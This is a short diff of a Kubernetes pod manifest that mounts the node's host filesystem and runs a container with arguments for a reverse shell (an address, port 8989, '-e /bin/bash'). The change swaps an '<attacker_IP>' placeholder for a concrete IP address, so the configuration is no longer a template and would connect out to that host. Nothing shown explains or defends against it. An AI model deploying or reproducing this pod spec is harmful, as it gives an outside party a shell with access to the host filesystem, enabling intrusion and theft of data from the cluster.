@@ -32,7 +32,7 @@ spec:
     volumeMounts:
     - mountPath: /host
       name: hostvolume
-    args: ['<attacker_IP>', '8989', '-e', '/bin/bash']
+    args: ['4.242.16.43', '8989', '-e', '/bin/bash']
   volumes:
   - name: hostvolume
     hostPath:
